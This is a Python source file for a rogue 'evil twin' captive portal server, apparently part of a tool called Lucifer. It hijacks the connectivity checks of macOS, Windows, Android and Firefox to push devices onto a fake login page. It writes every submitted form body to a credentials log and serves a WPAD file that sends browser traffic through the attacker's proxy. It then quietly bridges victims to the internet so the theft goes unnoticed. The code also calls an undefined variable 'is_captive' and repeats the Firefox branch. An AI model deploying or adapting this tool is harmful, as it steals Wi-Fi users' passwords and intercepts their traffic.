#!/usr/bin/env python3
"""
Multi-threaded captive portal HTTP server with:
- macOS CNA (Captive Network Assistant) detection and triggering
- Windows NCSI probe interception
- Android connectivity check interception
- RFC 8908 Captive Portal API endpoint
- WPAD proxy auto-config for Windows
- Credential capture with timestamped logging
- Static file serving from configurable portal directory
- Post-capture transparent bridge via iptables NAT

Replaces the single-threaded PHP built-in server. Handles concurrent
probe requests from multiple devices without blocking, which is
required to reliably trigger CNA within macOS's ~3-4 second timeout.
"""

import argparse
import json
import mimetypes
import os
import subprocess
import sys
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import parse_qs, urlparse


# Platform-specific probe paths that indicate captive portal detection
APPLE_PROBE_PATHS = frozenset(
    {
        "/hotspot-detect.html",
        "/library/test/success.html",
        "/success.txt",
    }
)

WINDOWS_PROBE_PATHS = frozenset(
    {
        "/connecttest.txt",
        "/ncsi.txt",
        "/redirect",
    }
)

ANDROID_PROBE_PATHS = frozenset(
    {
        "/generate_204",
        "/gen_204",
    }
)

FIREFOX_PROBE_PATHS = frozenset(
    {
        "/success.txt",
        "/canonical.html",
    }
)

# macOS CNA checks whether the response body matches this exactly.
# If it does → "internet works." If it doesn't → "captive portal detected."
# We return this AFTER the user submits credentials to dismiss CNA.
APPLE_SUCCESS_BODY = (
    "<HTML><HEAD><TITLE>Success</TITLE></HEAD>"
    "<BODY>Success</BODY></HTML>"
)

# ANSI colors for terminal output
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_CYAN = "\033[96m"
C_RED = "\033[91m"
C_RESET = "\033[0m"


def resolve_mac(ip):
    """Resolve a client IP to its MAC address via the ARP table."""
    try:
        with open("/proc/net/arp", "r") as f:
            for line in f.readlines()[1:]:
                fields = line.strip().split()
                if len(fields) >= 4 and fields[0] == ip:
                    mac = fields[3]
                    if mac != "00:00:00:00:00:00":
                        return mac
    except IOError as e:
        print(f"{C_RED}[ERROR]{C_RESET} Failed to read ARP table: {e}")
    return None


def allow_client(mac, upstream_iface, upstream_dns):
    """Add iptables rules to fully bridge a specific MAC to upstream internet."""
    rules = [
        [
            "iptables", "-t", "nat", "-I", "PREROUTING", "1",
            "-m", "mac", "--mac-source", mac,
            "-p", "udp", "--dport", "53",
            "-j", "DNAT", "--to-destination", f"{upstream_dns}:53",
        ],
        [
            "iptables", "-t", "nat", "-I", "PREROUTING", "1",
            "-m", "mac", "--mac-source", mac,
            "-p", "tcp", "--dport", "53",
            "-j", "DNAT", "--to-destination", f"{upstream_dns}:53",
        ],
        [
            "iptables", "-t", "nat", "-I", "PREROUTING", "1",
            "-m", "mac", "--mac-source", mac,
            "-p", "tcp", "--dport", "80",
            "-j", "RETURN",
        ],
        [
            "iptables", "-I", "FORWARD", "1",
            "-m", "mac", "--mac-source", mac,
            "-o", upstream_iface,
            "-j", "ACCEPT",
        ],
    ]
    try:
        for rule in rules:
            subprocess.run(rule, check=True)
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        print(
            f"{C_GREEN}[BRIDGE]{C_RESET} [{timestamp}] "
            f"Allowed {mac} through {upstream_iface} (DNS → {upstream_dns})"
        )
        return True
    except subprocess.CalledProcessError as e:
        print(f"{C_RED}[ERROR]{C_RESET} iptables allow failed: {e}")
        return False


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


class PortalHandler(BaseHTTPRequestHandler):
    portal_dir = "/tmp/evil_portal"
    creds_log = "/tmp/creds.txt"
    portal_ip = "192.168.4.1"
    upstream_iface = "eth0"
    upstream_dns = "8.8.8.8"
    allowed_macs = set()
    _mac_lock = threading.Lock()

    def _try_allow_client(self, client_ip):
        """Thread-safe client allow with deduplication."""
        mac = resolve_mac(client_ip)
        if not mac:
            return None

        mac_lower = mac.lower()
        with self._mac_lock:
            if mac_lower in self.allowed_macs:
                return mac_lower
            if allow_client(mac, self.upstream_iface, self.upstream_dns):
                self.allowed_macs.add(mac_lower)
                return mac_lower
        return None

    def do_GET(self):
        path = urlparse(self.path).path.lower()

        # RFC 8908 Captive Portal API (JSON)
        if path == "/api/captive":
            self._handle_captive_api()
            return

        # Firefox captive portal check (Must precede Apple due to path overlap)
        if (
            path in FIREFOX_PROBE_PATHS
            and "firefox" in self.headers.get("User-Agent", "").lower()
        ):
            self._log_probe("FIREFOX", path)
            client_ip = self.client_address[0]
            if self._try_allow_client(client_ip):
                body = b"success\n"
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return
            self._redirect_to_portal()
            return

        # Apple CNA probes
        if path in APPLE_PROBE_PATHS:
            self._log_probe("APPLE", path)
            client_ip = self.client_address[0]
            mac = resolve_mac(client_ip)
            if mac and mac.lower() in self.allowed_macs:
                content = APPLE_SUCCESS_BODY.encode()
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", str(len(content)))
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                self.wfile.write(content)
                return
            self._redirect_to_portal()
            return

        # Windows NCSI probes
        if path in WINDOWS_PROBE_PATHS:
            self._log_probe("WINDOWS", path)
            client_ip = self.client_address[0]
            mac = resolve_mac(client_ip)
            if mac and mac.lower() in self.allowed_macs:
                if path == "/connecttest.txt":
                    body = b"Microsoft Connect Test"
                    self.send_response(200)
                    self.send_header("Content-Type", "text/plain")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
                    return
                if path == "/ncsi.txt":
                    body = b"Microsoft NCSI"
                    self.send_response(200)
                    self.send_header("Content-Type", "text/plain")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
                    return
                if path == "/redirect":
                    self.send_response(200)
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    return
            self._redirect_to_portal()
            return

        # Android connectivity probes
        if path in ANDROID_PROBE_PATHS:
            self._log_probe("ANDROID", path)
            client_ip = self.client_address[0]
            mac = resolve_mac(client_ip)
            if mac and mac.lower() in self.allowed_macs:
                self.send_response(204)
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            self._redirect_to_portal()
            return

        # Firefox captive portal check
        if (
            path in FIREFOX_PROBE_PATHS
            and "firefox" in self.headers.get("User-Agent", "").lower()
        ):
            self._log_probe("FIREFOX", path)
            client_ip = self.client_address[0]
            mac = resolve_mac(client_ip)
            if mac and mac.lower() in self.allowed_macs:
                body = b"success\n"
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return
            self._redirect_to_portal()
            return

        # WPAD proxy auto-config
        if path == "/wpad.dat":
            self._handle_wpad()
            return

        # Serve portal content
        self._serve_file(path)

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        raw_body = self.rfile.read(content_length)
        body = raw_body.decode("utf-8", errors="replace")
        post_path = urlparse(self.path).path

        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        client_ip = self.client_address[0]
        user_agent = self.headers.get("User-Agent", "unknown")

        log_entry = (
            f"[{timestamp}] "
            f"IP={client_ip} "
            f"PATH={post_path} "
            f"UA={user_agent} "
            f"DATA={body}\n"
        )

        print(f"{C_GREEN}[CAPTURED]{C_RESET} {log_entry.strip()}")

        try:
            with open(self.creds_log, "a") as f:
                f.write(log_entry)
        except IOError as e:
            print(f"{C_RED}[ERROR]{C_RESET} Failed to write creds: {e}")

        if not self._try_allow_client(client_ip):
            print(
                f"{C_RED}[BRIDGE]{C_RESET} "
                f"Could not resolve MAC for {client_ip}"
            )
            self._redirect_to_portal()
            return

        # Respond with Apple success page to dismiss CNA.
        # On non-Apple clients this is harmless — they see a brief
        # "Success" page and the portal closes.
        content = APPLE_SUCCESS_BODY.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(content)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(content)

    def _handle_captive_api(self):
        """RFC 8908 Captive Portal API — returns JSON indicating captive state."""
        payload = {
            "captive": is_captive,
            "user-portal-url": f"http://{self.portal_ip}/",
            "venue-info-url": f"http://{self.portal_ip}/",
        }
        body = json.dumps(payload).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/captive+json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _handle_wpad(self):
        """WPAD proxy auto-discovery for Windows."""
        wpad_script = (
            "function FindProxyForURL(url, host) {\n"
            f'  return "PROXY {self.portal_ip}:80";\n'
            "}\n"
        ).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/x-ns-proxy-autoconfig")
        self.send_header("Content-Length", str(len(wpad_script)))
        self.end_headers()
        self.wfile.write(wpad_script)

    def _redirect_to_portal(self):
        """302 redirect to portal root — triggers CNA/NCSI portal detection."""
        self.send_response(302)
        self.send_header("Location", f"http://{self.portal_ip}/")
        self.send_header("Content-Length", "0")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()

    def _serve_file(self, path):
        """Serve static files from the portal directory."""
        if path in ("/", "/index.php", "/index.html", "/index.htm"):
            # Try common index files in order
            for index_name in ("index.html", "index.php", "index.htm"):
                candidate = os.path.join(self.portal_dir, index_name)
                if os.path.isfile(candidate):
                    self._send_file(candidate)
                    return
            # No index file found — redirect to avoid 404 on probes
            self._redirect_to_portal()
            return

        # Resolve requested path within portal_dir
        safe_path = path.lstrip("/")
        file_path = os.path.normpath(os.path.join(self.portal_dir, safe_path))

        # Path traversal protection
        if not file_path.startswith(os.path.normpath(self.portal_dir)):
            self._redirect_to_portal()
            return

        if os.path.isfile(file_path):
            self._send_file(file_path)
        else:
            # Unknown path — redirect to portal index
            self._redirect_to_portal()

    def _send_file(self, file_path):
        """Read and send a file with appropriate content type."""
        content_type = self._detect_content_type(file_path)
        try:
            with open(file_path, "rb") as f:
                content = f.read()
        except IOError:
            self._redirect_to_portal()
            return

        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(content)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(content)

    def _detect_content_type(self, path):
        """Map file extension to MIME type."""
        extension_map = {
            ".html": "text/html; charset=utf-8",
            ".php": "text/html; charset=utf-8",
            ".htm": "text/html; charset=utf-8",
            ".css": "text/css; charset=utf-8",
            ".js": "application/javascript; charset=utf-8",
            ".json": "application/json; charset=utf-8",
            ".png": "image/png",
            ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg",
            ".gif": "image/gif",
            ".svg": "image/svg+xml",
            ".ico": "image/x-icon",
            ".woff": "font/woff",
            ".woff2": "font/woff2",
            ".ttf": "font/ttf",
        }
        for ext, mime in extension_map.items():
            if path.lower().endswith(ext):
                return mime
        guessed = mimetypes.guess_type(path)[0]
        return guessed or "application/octet-stream"

    def _log_probe(self, platform, path):
        ip = self.client_address[0]
        ua = self.headers.get("User-Agent", "")[:60]
        print(f"{C_YELLOW}[{platform} PROBE]{C_RESET} {ip} → {path}  ({ua})")

    def log_message(self, format, *args):
        """Suppress default BaseHTTPRequestHandler access logging."""
        pass


def main():
    parser = argparse.ArgumentParser(
        description="Threaded captive portal server for Lucifer",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--bind",
        default="0.0.0.0",
        help="Address to bind to",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=80,
        help="Port to listen on",
    )
    parser.add_argument(
        "--portal-dir",
        default="/tmp/evil_portal",
        help="Directory containing portal HTML/CSS/JS files",
    )
    parser.add_argument(
        "--creds-log",
        default="/tmp/creds.txt",
        help="File path for captured credential log",
    )
    parser.add_argument(
        "--portal-ip",
        default="192.168.4.1",
        help="IP address of the portal (used in redirects and API responses)",
    )
    parser.add_argument(
        "--upstream-iface",
        default="eth0",
        help="Upstream network interface for NAT bridge to internet",
    )
    parser.add_argument(
        "--upstream-dns",
        default="8.8.8.8",
        help="Upstream DNS server for bridged clients",
    )
    args = parser.parse_args()

    if not os.path.isdir(args.portal_dir):
        print(
            f"{C_RED}[!] Portal directory not found: {args.portal_dir}{C_RESET}"
        )
        sys.exit(1)

    # Configure handler class variables
    PortalHandler.portal_dir = args.portal_dir
    PortalHandler.creds_log = args.creds_log
    PortalHandler.portal_ip = args.portal_ip
    PortalHandler.upstream_iface = args.upstream_iface
    PortalHandler.upstream_dns = args.upstream_dns

    server = ThreadedHTTPServer((args.bind, args.port), PortalHandler)

    print(f"{C_CYAN}[*] Portal server (threaded) listening on "
          f"{args.bind}:{args.port}{C_RESET}")
    print(f"    Portal dir:  {args.portal_dir}")
    print(f"    Creds log:   {args.creds_log}")
    print(f"    Portal IP:   {args.portal_ip}")
    print(f"    Upstream:    {args.upstream_iface}")
    print(f"    DNS:         {args.upstream_dns}")
    print(f"    Probe paths: Apple={len(APPLE_PROBE_PATHS)} "
          f"Windows={len(WINDOWS_PROBE_PATHS)} "
          f"Android={len(ANDROID_PROBE_PATHS)}")
    print("")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{C_YELLOW}[*] Portal server shutting down.{C_RESET}")
        server.server_close()


if __name__ == "__main__":
    main()
